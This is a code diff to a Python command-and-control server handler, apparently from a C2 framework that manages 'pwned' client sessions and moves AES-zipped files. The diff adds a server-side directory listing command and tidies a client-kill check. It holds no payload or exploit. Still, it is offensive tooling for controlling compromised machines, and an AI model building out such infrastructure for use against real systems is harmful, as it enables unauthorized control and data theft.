@@ -10,7 +10,7 @@ from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT,
 
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from inputimeout import inputimeout, TimeoutOccurred
-from os import mkdir, path
+from os import mkdir, path, listdir
 
 def get_new_session():
     """ This function check if other sessions exists. If none re-initialize variables. However, if sessions do exist,
@@ -96,6 +96,7 @@ class C2Handler(BaseHTTPRequestHandler):
                             else:
                                 print(key, "-", value)
                         print("\nYour active session:", print_last, sep="\n")
+                        
                     elif cmd == C2Commands.SERV_CTRL.value: # server control
                         try:
                             possible_new_session = int(cmd.split()[2])
@@ -106,6 +107,7 @@ class C2Handler(BaseHTTPRequestHandler):
                                 raise ValueError
                         except (ValueError, IndexError):
                             print(f"You must enter a proper pwned id. Use {C2Commands.SERV_SH_CLS.value} command.")
+
                     elif cmd == C2Commands.SERV_ZIP.value: # server zip
                         filename = None 
                         try:
@@ -120,6 +122,7 @@ class C2Handler(BaseHTTPRequestHandler):
                             print(f"Unable to access {OUTGOING}/{filename}.\n")
                         except IndexError:
                             print(f"You must enter the filename located in {OUTGOING} to zip.\n")
+
                     elif cmd == C2Commands.SERV_UZIP.value: # server unzip
                         filename = None
                         try:
@@ -132,6 +135,19 @@ class C2Handler(BaseHTTPRequestHandler):
                             print(f"{filename} was not found in {INCOMING}.\n")
                         except IndexError:
                             print(f"You must enter the filename located in {INCOMING} to unzip.\n")
+
+                    elif cmd.startswith(C2Commands.SERV_LS.value): # server list
+                        directory = None
+                        try:
+                            directory = cmd.split()[2]
+                            print(*listdir(directory), sep="\n")
+                        except NotADirectoryError:
+                            print(f"{directory} is not a directory.")
+                        except FileNotFoundError:
+                            print(f"{directory} was not found on the server.")
+                        except IndexError:
+                            print(*listdir(), sep="\n")
+
                     elif cmd == C2Commands.SERV_EXT.value: # server exit
                         print("The C2 server has been shut down.")
                         server.shutdown()
@@ -144,7 +160,7 @@ class C2Handler(BaseHTTPRequestHandler):
                         print(f"Lost connection to {pwned_dict[active_session]}.\n")
                         get_new_session()
                     else:
-                        if cmd.startswith("client kill"):
+                        if cmd.startswith(C2Commands.CLS_KLL.value): # client kill
                             get_new_session()
                     
 
